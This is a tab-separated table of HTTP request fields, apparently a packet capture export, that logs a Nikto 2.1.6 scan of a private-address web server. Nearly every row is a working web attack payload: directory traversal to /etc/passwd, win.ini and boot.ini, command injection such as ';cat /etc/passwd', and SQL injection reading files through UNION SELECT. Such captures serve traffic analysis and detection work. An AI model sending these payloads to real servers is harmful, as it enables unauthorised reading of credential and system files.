http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.104									2360						1	http://192.168.1.104/cgi-bin/hsx.cgi?show=../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000607)				/cgi-bin/hsx.cgi?show=../../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.104									2362						1	http://192.168.1.104/cgi-bin/sewse?/home/httpd/html/sewse/jabber/comment2.jse+/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000608)				/cgi-bin/sewse?/home/httpd/html/sewse/jabber/comment2.jse+/etc/passwd
																	Keep-Alive										192.168.1.104									2364						1	http://192.168.1.104/cgi-bin/sbcgi/sitebuilder.cgi		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000609)				/cgi-bin/sbcgi/sitebuilder.cgi
																	Keep-Alive										192.168.1.104									2366						1	http://192.168.1.104/cgi-bin/mrtg.cgi?cfg=../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000610)				/cgi-bin/mrtg.cgi?cfg=../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2368						1	http://192.168.1.104/cgi-bin/mrtg.cfg?cfg=../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000611)				/cgi-bin/mrtg.cfg?cfg=../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2370						1	http://192.168.1.104/cgi-bin/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000612)				/cgi-bin/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2372						1	http://192.168.1.104/cgi-bin/main.cgi?board=FREE_BOARD&command=down_load&filename=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000612)				/cgi-bin/main.cgi?board=FREE_BOARD&command=down_load&filename=../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2374						1	http://192.168.1.104/cgi-bin/mail/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000613)				/cgi-bin/mail/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.104									2376						1	http://192.168.1.104/cgi-bin/mail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000614)				/cgi-bin/mail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.104									2378						1	http://192.168.1.104/cgi-bin/loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000615)				/cgi-bin/loadpage.cgi?user_id=1&file=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
																	Keep-Alive										192.168.1.104									2380						1	http://192.168.1.104/cgi-bin/loadpage.cgi?user_id=1&file=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000616)				/cgi-bin/loadpage.cgi?user_id=1&file=../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2382						1	http://192.168.1.104/cgi-bin/htsearch?exclude=%60/etc/passwd%60		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000617)				/cgi-bin/htsearch?exclude=%60/etc/passwd%60
																	Keep-Alive										192.168.1.104									2384						1	http://192.168.1.104/cgi-bin/shop.cgi?page=../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000618)				/cgi-bin/shop.cgi?page=../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2386						1	http://192.168.1.104/cgi-bin/sendtemp.pl?templ=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000619)				/cgi-bin/sendtemp.pl?templ=../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2388						1	http://192.168.1.104/cgi-bin/search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000620)				/cgi-bin/search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc
																	Keep-Alive										192.168.1.104									2390						1	http://192.168.1.104/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000621)				/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.104									2392						1	http://192.168.1.104/cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000622)				/cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
																	Keep-Alive										192.168.1.104									2394						1	http://192.168.1.104/cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000623)				/cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
																	Keep-Alive										192.168.1.104									2396						1	http://192.168.1.104/cgi-bin/quickstore.cgi?page=../../../../../../../../../../etc/passwd%00html&cart_id=		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000624)				/cgi-bin/quickstore.cgi?page=../../../../../../../../../../etc/passwd%00html&cart_id=
																	Keep-Alive										192.168.1.104									2398						1	http://192.168.1.104/cgi-bin/publisher/search.cgi?dir=jobs&template=;cat%20/etc/passwd|&output_number=10		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000625)				/cgi-bin/publisher/search.cgi?dir=jobs&template=;cat%20/etc/passwd|&output_number=10
																	Keep-Alive										192.168.1.104									2400						1	http://192.168.1.104/cgi-bin/php.cgi?/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000626)				/cgi-bin/php.cgi?/etc/passwd
																	Keep-Alive										192.168.1.104									2402						1	http://192.168.1.104/cgi-bin/pals-cgi?palsAction=restart&documentName=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000627)				/cgi-bin/pals-cgi?palsAction=restart&documentName=/etc/passwd
																	Keep-Alive										192.168.1.104									2404						1	http://192.168.1.104/cgi-bin/opendir.php?/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000628)				/cgi-bin/opendir.php?/etc/passwd
																	Keep-Alive										192.168.1.104									2406						1	http://192.168.1.104/cgi-bin/nph-emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000629)				/cgi-bin/nph-emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.104									2408						1	http://192.168.1.104/cgi-bin/newsdesk.cgi?t=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000630)				/cgi-bin/newsdesk.cgi?t=../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2410						1	http://192.168.1.104/cgi-bin/netauth.cgi?cmd=show&page=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000631)				/cgi-bin/netauth.cgi?cmd=show&page=../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2412						1	http://192.168.1.104/cgi-bin/multihtml.pl?multi=/etc/passwd%00html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000632)				/cgi-bin/multihtml.pl?multi=/etc/passwd%00html
																	Keep-Alive										192.168.1.104									2414						1	http://192.168.1.104/cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000633)				/cgi-bin/webdist.cgi?distloc=;cat%20/etc/passwd
																	Keep-Alive										192.168.1.104									2416						1	http://192.168.1.104/cgi-bin/way-board/way-board.cgi?db=/etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000634)				/cgi-bin/way-board/way-board.cgi?db=/etc/passwd%00
																	Keep-Alive										192.168.1.104									2418						1	http://192.168.1.104/cgi-bin/way-board.cgi?db=/etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000635)				/cgi-bin/way-board.cgi?db=/etc/passwd%00
																	Keep-Alive										192.168.1.104									2420						1	http://192.168.1.104/cgi-bin/viewsource?/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000637)				/cgi-bin/viewsource?/etc/passwd
																	Keep-Alive										192.168.1.104									2422						1	http://192.168.1.104/cgi-bin/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000638)				/cgi-bin/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2424						1	http://192.168.1.104/cgi-bin/traffic.cgi?cfg=../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000639)				/cgi-bin/traffic.cgi?cfg=../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2426						1	http://192.168.1.104/cgi-bin/technote/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=/../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000640)				/cgi-bin/technote/main.cgi?board=FREE_BOARD&command=down_load&fileNikto=/../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2428						1	http://192.168.1.104/cgi-bin/technote/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000640)				/cgi-bin/technote/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2430						1	http://192.168.1.104/cgi-bin/talkback.cgi?article=../../../../../../../../etc/passwd%00&action=view&matchview=1		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000641)				/cgi-bin/talkback.cgi?article=../../../../../../../../etc/passwd%00&action=view&matchview=1
																	Keep-Alive										192.168.1.104									2432						1	http://192.168.1.104/cgi-bin/story/story.pl?next=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000642)				/cgi-bin/story/story.pl?next=../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.104									2434						1	http://192.168.1.104/cgi-bin/story.pl?next=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000643)				/cgi-bin/story.pl?next=../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.104									2436						1	http://192.168.1.104/cgi-bin/store/index.cgi?page=../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000644)				/cgi-bin/store/index.cgi?page=../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2438						1	http://192.168.1.104/cgi-bin/store.cgi?StartID=../../../../../../../../../../etc/passwd%00.html		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000645)				/cgi-bin/store.cgi?StartID=../../../../../../../../../../etc/passwd%00.html
																	Keep-Alive										192.168.1.104									2440						1	http://192.168.1.104/cgi-bin/ssi//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000646)				/cgi-bin/ssi//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
																	Keep-Alive										192.168.1.104															1	http://192.168.1.104/cgi-bin/sojourn.cgi?cat=../../../../../../../../../../etc/password%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000647)				/cgi-bin/sojourn.cgi?cat=../../../../../../../../../../etc/password%00
																	Keep-Alive										192.168.1.104									2450						1	http://192.168.1.104/cgi-bin/simple/view_page?mv_arg=|cat%20/etc/passwd|		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000648)				/cgi-bin/simple/view_page?mv_arg=|cat%20/etc/passwd|
																	Keep-Alive										192.168.1.104									2454						1	http://192.168.1.104/cgi-bin/shopper.cgi?newpage=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000649)				/cgi-bin/shopper.cgi?newpage=../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2456						1	http://192.168.1.104/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000650)				/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.104									2458						1	http://192.168.1.104/webcalendar/forum.php?user_inc=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000651)				/webcalendar/forum.php?user_inc=../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2460						1	http://192.168.1.104/logbook.pl?file=../../../../../../../bin/cat%20/etc/passwd%00|		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000652)				/logbook.pl?file=../../../../../../../bin/cat%20/etc/passwd%00|
																	Keep-Alive										192.168.1.104									2462						1	http://192.168.1.104/cgi-bin/sawmill5?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000653)				/cgi-bin/sawmill5?rfcf+%22/etc/passwd%22+spbn+1,1,21,1,1,1,1
																	Keep-Alive										192.168.1.104									2464						1	http://192.168.1.104/page.cgi?../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000654)				/page.cgi?../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2466						1	http://192.168.1.104/edittag/edittag.cgi?file=%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000655)				/edittag/edittag.cgi?file=%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd
																	Keep-Alive										192.168.1.104									2468						1	http://192.168.1.104/base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../../etc/passwd&id=1		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000656)				/base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../../etc/passwd&id=1
																	Keep-Alive										192.168.1.104									2470						1	http://192.168.1.104/cgi-bin/zml.cgi?file=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000659)				/cgi-bin/zml.cgi?file=../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.104									2472						1	http://192.168.1.104/cgi-bin/YaBB.pl?board=news&action=display&num=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000660)				/cgi-bin/YaBB.pl?board=news&action=display&num=../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.104									2474						1	http://192.168.1.104/cgi-bin/whois_raw.cgi?fqdn=%0Acat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000661)				/cgi-bin/whois_raw.cgi?fqdn=%0Acat%20/etc/passwd
																	Keep-Alive										192.168.1.104									2476						1	http://192.168.1.104/cgi-bin/whois/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000662)				/cgi-bin/whois/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
																	Keep-Alive										192.168.1.104									2478						1	http://192.168.1.104/cgi-bin/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000663)				/cgi-bin/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
																	Keep-Alive										192.168.1.104									2480						1	http://192.168.1.104/cgi-bin/webspirs.cgi?sp.nextform=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000664)				/cgi-bin/webspirs.cgi?sp.nextform=../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2482						1	http://192.168.1.104/cgi-bin/webplus?script=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000665)				/cgi-bin/webplus?script=../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2484						1	http://192.168.1.104/cgi-bin/webmail/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000666)				/cgi-bin/webmail/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
																	Keep-Alive										192.168.1.104									2486						1	http://192.168.1.104/athenareg.php?pass=%20;cat%20/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000667)				/athenareg.php?pass=%20;cat%20/etc/passwd
																	Keep-Alive										192.168.1.104									2488						1	http://192.168.1.104/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000668)				/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd
																	Keep-Alive										192.168.1.104									2490						1	http://192.168.1.104/search?NS-query-pat=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000669)				/search?NS-query-pat=../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104									2492						1	http://192.168.1.104/search?NS-query-pat=..\..\..\..\..\..\..\..\..\..\boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000670)				/search?NS-query-pat=..\..\..\..\..\..\..\..\..\..\boot.ini
																	Keep-Alive										192.168.1.104									2494						1	http://192.168.1.104/..\..\..\..\..\..\temp\temp.class		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000671)				/..\..\..\..\..\..\temp\temp.class
																	Keep-Alive										192.168.1.104									2496						1	http://192.168.1.104/../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000672)				/../../../../../../../../../../etc/passwd
																	Keep-Alive										192.168.1.104															1	http://192.168.1.104/.../.../.../.../.../.../.../.../.../boot.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000673)				/.../.../.../.../.../.../.../.../.../boot.ini
																	Keep-Alive										192.168.1.104									2506						1	http://192.168.1.104/................../etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000674)				/................../etc/passwd
																	Keep-Alive										192.168.1.104									2510						1	http://192.168.1.104/%3f.jsp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000675)				/%3f.jsp
																	Keep-Alive										192.168.1.104									2512						1	http://192.168.1.104/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000677)				/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini
																	Keep-Alive										192.168.1.104															1	http://192.168.1.104/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000678)				/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
																	Keep-Alive										192.168.1.104															1	http://192.168.1.104/%00		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000679)				/%00
																	Keep-Alive										192.168.1.104									2532						1	http://192.168.1.104/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000680)				/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini
																	Keep-Alive										192.168.1.104									2536						1	http://192.168.1.104/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000681)				/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd
																	Keep-Alive										192.168.1.104									2538						1	http://192.168.1.104/ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000682)				/ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini
																	Keep-Alive										192.168.1.104									2540						1	http://192.168.1.104/admentor/adminadmin.asp		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000683)				/admentor/adminadmin.asp
																	Keep-Alive										192.168.1.104									2542						1	http://192.168.1.104/My_eGallery/public/displayCategory.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000684)				/My_eGallery/public/displayCategory.php
																	Keep-Alive										192.168.1.104									2544						1	http://192.168.1.104/postnuke/My_eGallery/public/displayCategory.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000684)				/postnuke/My_eGallery/public/displayCategory.php
																	Keep-Alive										192.168.1.104									2546						1	http://192.168.1.104/postnuke/html/My_eGallery/public/displayCategory.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000684)				/postnuke/html/My_eGallery/public/displayCategory.php
																	Keep-Alive										192.168.1.104									2548						1	http://192.168.1.104/modules/My_eGallery/public/displayCategory.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000684)				/modules/My_eGallery/public/displayCategory.php
																	Keep-Alive										192.168.1.104									2550						1	http://192.168.1.104/phpBB/My_eGallery/public/displayCategory.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000684)				/phpBB/My_eGallery/public/displayCategory.php
																	Keep-Alive										192.168.1.104									2552						1	http://192.168.1.104/forum/My_eGallery/public/displayCategory.php		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000684)				/forum/My_eGallery/public/displayCategory.php
																	Keep-Alive										192.168.1.104									2554						1	http://192.168.1.104/cgi-bin/classifieds/index.cgi		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000685)				/cgi-bin/classifieds/index.cgi
																	Keep-Alive										192.168.1.104									2556						1	http://192.168.1.104/imp/mailbox.php3?actionID=6&server=x&imapuser=x';somesql+--&pass=x		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000686)				/imp/mailbox.php3?actionID=6&server=x&imapuser=x';somesql+--&pass=x
																	Keep-Alive										192.168.1.104									2558						1	http://192.168.1.104/userinfo.php?uid=1;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000687)				/userinfo.php?uid=1;
																	Keep-Alive										192.168.1.104									2560						1	http://192.168.1.104/site/'		GET				UNION ALL SELECT FileToClob('/etc/passwd','server')::html,0 FROM sysusers WHERE username=USER --/.html HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000688)				/site/'
																	Keep-Alive										192.168.1.104															1	http://192.168.1.104/site/'		GET				UNION ALL SELECT FileToClob('/etc/passwd','server')::html,0 FROM sysusers WHERE username = USER --/.html HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000689)				/site/'
